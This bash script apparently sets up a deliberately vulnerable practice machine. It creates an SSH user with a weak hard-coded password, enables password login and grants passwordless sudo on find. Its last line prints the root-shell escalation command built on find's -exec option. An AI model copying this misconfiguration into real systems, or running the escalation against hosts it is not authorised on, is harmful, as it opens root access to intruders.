#!/bin/bash
set -e

# Install required packages
apt-get update -y
apt-get install -y sudo openssh-server findutils

# Create the sysadmin user if not already present
if ! id -u sysadmin &>/dev/null; then
    useradd -m -s /bin/bash sysadmin
fi
echo 'sysadmin:sysadmin123' | chpasswd

# Write the sudoers drop-in file for sysadmin (overwrite if exists)
echo 'sysadmin ALL=(root) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/sysadmin
chmod 0440 /etc/sudoers.d/sysadmin

# Validate sudoers syntax
visudo -c -f /etc/sudoers.d/sysadmin

# Configure SSH server
mkdir -p /var/run/sshd
# Ensure PasswordAuthentication is enabled
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
# Disable root login
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config

# Generate SSH host keys if not present
ssh-keygen -A

# Start SSH service (handle both systemd and non-systemd)
service ssh start || service sshd start || /usr/sbin/sshd || true

echo 'Setup complete. User sysadmin can escalate via: sudo find /. -maxdepth 0 -exec /bin/bash -p \; -quit'
